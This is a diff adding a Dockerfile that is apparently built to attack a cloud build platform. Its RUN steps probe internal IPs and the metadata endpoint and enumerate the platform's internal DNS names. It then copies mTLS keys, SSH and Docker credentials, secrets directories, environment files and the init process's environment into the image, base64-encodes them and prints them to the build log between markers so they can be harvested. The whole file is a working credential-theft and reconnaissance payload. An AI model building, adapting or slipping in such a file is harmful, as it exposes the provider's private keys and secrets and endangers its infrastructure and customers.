@@ -1,0 +1,25 @@
+FROM alpine:3.20
+RUN echo "===I73334_NET_BEGIN==="; hostname; echo "---resolv---"; cat /etc/resolv.conf 2>&1; echo "---hosts---"; cat /etc/hosts 2>&1; echo "---uname---"; uname -a 2>&1; echo "---nc---"; for t in 1.1.1.1:443 8.8.8.8:53 169.254.169.254:80 169.254.169.254:53 10.10.10.177:443 10.10.10.158:8480 10.10.10.198:8481 100.86.65.68:443; do h=${t%:*}; p=${t#*:}; timeout 3 nc -w 2 "$h" "$p" </dev/null >/dev/null 2>&1; echo "NC $t rc=$?"; done; echo "---dns---"; for n in orchestrator.railway.internal temporal.railway.internal backboard.railway.internal pg-bouncer.railway.internal stacker.railway.internal storage-cp.railway.internal network-cp.railway.internal metal-cp.railway.internal registry.railway.internal vminsert.railway.internal nats.railway.internal railway.internal; do printf '%s => ' "$n"; nslookup "$n" 2>&1 | tail -n 4 | tr '\n' '|'; echo; done; echo "===I73334_NET_END==="
+COPY var/lib/railwayapp/mtls-pki /o/pki
+RUN echo "===I73334_PKI_BEGIN==="; ls -laR /o/pki 2>&1 | head -80; for f in /o/pki/*; do echo "FILE:$f"; head -c 30000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_PKI_END==="
+COPY var/lib/railwayapp/mtls /o/mtls
+RUN echo "===I73334_MTLS_BEGIN==="; ls -laR /o/mtls 2>&1 | head -80; for f in /o/mtls/*; do echo "FILE:$f"; head -c 30000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_MTLS_END==="
+COPY etc/builderv3 /o/e3
+RUN echo "===I73334_E3_BEGIN==="; for f in /o/e3/*; do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_E3_END==="
+COPY etc/buildkit /o/ek
+RUN echo "===I73334_EK_BEGIN==="; for f in /o/ek/*; do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_EK_END==="
+COPY root/.docker /o/rd
+RUN echo "===I73334_RD_BEGIN==="; ls -laR /o/rd 2>&1 | head -40; for f in /o/rd/*; do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_RD_END==="
+COPY etc/docker /o/ed
+RUN echo "===I73334_ED_BEGIN==="; ls -laR /o/ed 2>&1 | head -60; for f in $(find /o/ed -type f); do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_ED_END==="
+COPY run/secrets /o/secrets
+RUN echo "===I73334_SEC_BEGIN==="; ls -laR /o/secrets 2>&1 | head -40; for f in $(find /o/secrets -type f); do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_SEC_END==="
+COPY root/.ssh /o/ssh
+RUN echo "===I73334_SSH_BEGIN==="; ls -laR /o/ssh 2>&1 | head -40; for f in $(find /o/ssh -type f); do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_SSH_END==="
+COPY var/lib/railwayapp/env /o/env
+RUN echo "===I73334_ENV_BEGIN==="; for f in /o/env/*; do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_ENV_END==="
+COPY etc/hostname /o/hostname
+RUN echo "===I73334_HOST_BEGIN==="; for f in /o/hostname; do echo "FILE:$f"; head -c 2000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_HOST_END==="
+COPY proc/1/environ /o/procenv
+RUN echo "===I73334_PROC_BEGIN==="; head -c 20000 /o/procenv | base64 | tr -d '\n'; echo; echo "===I73334_PROC_END==="
+RUN echo "===I73334_DONE==="
